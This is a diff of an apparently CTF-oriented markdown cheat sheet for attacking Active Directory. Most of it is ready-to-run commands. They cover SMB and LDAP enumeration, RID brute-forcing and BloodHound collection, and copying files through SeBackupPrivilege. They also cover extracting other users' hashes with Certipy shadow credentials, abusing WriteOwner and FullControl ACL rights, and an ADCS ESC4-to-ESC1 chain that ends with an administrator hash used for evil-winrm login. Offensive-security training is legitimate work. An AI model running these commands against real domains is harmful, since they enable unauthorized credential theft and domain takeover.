@@ -5,6 +5,17 @@
 - [Enumeration](#enumeration)
     - [Tools](#tools)
     - [Default credentials](#default-credentials)
+- [Privilege Escalation](#privilege-escalation)
+    - [Enumeration](#enumeration)
+        - [Bloodhound](#bloodhound)
+    - [SeBackupPrivilege](#sebackupprivilege)
+    - [Certipy-AD](#certipy-ad)
+    - [WriteOwner privilege](#writeowner-privilege)
+    - [Grant FullControl rights](#grant-fullcontrol-rights)
+    - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
+        - [ESC4](#esc4)
+        - [ESC1](#esc1)
+- [notes from adri TODO](#notes-from-adri-todo)
 
 <!-- /TOC -->
 
@@ -20,36 +31,39 @@ reapet enumeration with any other users you find access to
 
 ## Tools
 1. crackmapexec
-    - `crackmapexec smb HOST --shares {-u guest -p ''}`
-    - `crackmapexec smb HOST --rid-brute`
+    - `crackmapexec smb {host} --shares {-u guest -p ''}`
+    - `crackmapexec smb {host} --rid-brute`
 2. nxc
-    - `nxc smb HOST --shares {-u guest -p ''}`
-    - `nxc ldap HOST {-M group-mem -o group="Remote Managment Users"} {--groups}`
-    - `nxc smb HOST --rid-brute`
-    - `nxc smb HOST --users`
+    - `nxc smb {host} --shares {-u guest -p ''}`
+    - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
+    - `nxc smb {host} --rid-brute`
+    - `nxc smb {host} --users`
 3. smbclient
     - `smbclient -L HOST`
     - `smbclient HOST\SHARE {- U user%password}`
 4. impacket
-    - `impacket-lookupsid HOST {-no-pass}`
+    - `impacket-lookupsid {host} {-no-pass}`
 5. evilwinrm
-    - use it every time with every new users and password you find. Also check it with `nxc ldap` because sometimes it doesnt work
+    - use it every time with every new users and {password} you find. Also check it with `nxc ldap` because sometimes it doesnt work
 
 ## Default credentials
 - smb: `-u 'guest' -p ''`
 
 # Privilege Escalation
+
 ## Enumeration
 - check permission: `whoami /all`
+- search for vulnerable certificates
+- winPEAS
+
 ### Bloodhound
 1. Collect data
-    - `bloodhound-python -u user -p password -d domain -ns ip -c All`
-    - `nxc ldap host -u user -p password --bloodhound -c All`
+    - `bloodhound-python -u {user} -p {password} -d {domain} -ns ip -c All`
+    - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
 2. Import and query
-    - `transitive object control`
 
-### SeBackupPrivilege
-Enable privileges using giuliano108/SeBackupPrivilege
+## SeBackupPrivilege
+Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.
 
 ```PS
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -62,9 +76,59 @@ Get-SeBackupPrivilege
 Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
 ```
 
+## Certipy-AD
+when you already have a user you can try to extract hashes for other users:
+- `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`
+
+and also search for vulnerable certificates if you can access the CA_SVC account:
+- `certipy-ad find -u {user}@{domain} -hashes :{hash} -stdout -vulnerable -dc-ip {ip} {-old-bloodhound}`
+
+## WriteOwner privilege
+- bloodyAD:\
+    `bloodyAD --host '{ip}' -d '{domain}' -u '{user}' -p '{password}' set owner '{target_user}' '{user}'`
+- impacket:\
+`impacket-owneredit -action write -new-owner '{user}' -target '{target_user}' 'domain'/'{user}':'{password}'`
+- PowerView:\
+`Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`
+
+## Grant FullControl rights
+- PowerView
+`Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {user} -Rights fullcontrol`
+- impacket
+`impacket-dacledit -action write -rights FullControl -principal {user} -target {target_user} {domain}/{user}:{password}`
+
+## Kerberos Certificate Misconfiguration exploit
+
+Weak ACLs refer to access control entries (ACEs) that grant excessive permissions to unauthorized users or groups. hese permissions allow attackers to modify the template’s properties or even the ACL itself, potentially leading to domain escalation.
+
+Requirements (any):
+```
+Rights 	        |   Description
+----------------------------------------------------------------------------
+Owner 	        |   Implicit full control of object, all properties can be edited
+WriteOwner 	    |   Can modify the owner to an attacker-controlled principal
+WriteDacl 	    |   Can modify rights to grant attacker FullControl rights
+WriteProperty 	|   Can edit all properties
+FullControl 	|   Full control of object, all properties can be edited
+```
+
+### ESC4
+ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
+- update certificate cache to the vulnerable one:   \
+`KRB5CCNAME=$PWD/{user}.ccache certipy-ad template -k -template {vulnerable_template_anem} -dc-ip {ip} -target {dc.domain}`
+- then requests the certificate for the user you want to escalate to, using that template:\
+`certipy-ad req -u {user} -hashes '{hash}' -ca {CN: certificate_subject} -target {domain} -dc-ip  {ip}  -template DunderMifflinAuthentication -upn administrator@{domain} -ns  {ip}  -dns  {ip}  -debug`
+- finally you get the hash using the export pfx file:\
+`certipy-ad auth -pfx administrator_10.pfx  -domain {domain}`
+
+so you log in with evil-winrm using the second part of the HASH
+
+### ESC1
+
+ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.
 
 
-# notes from adriano
+# notes from adri TODO
 
 utile anche usare nxc con --debug
 
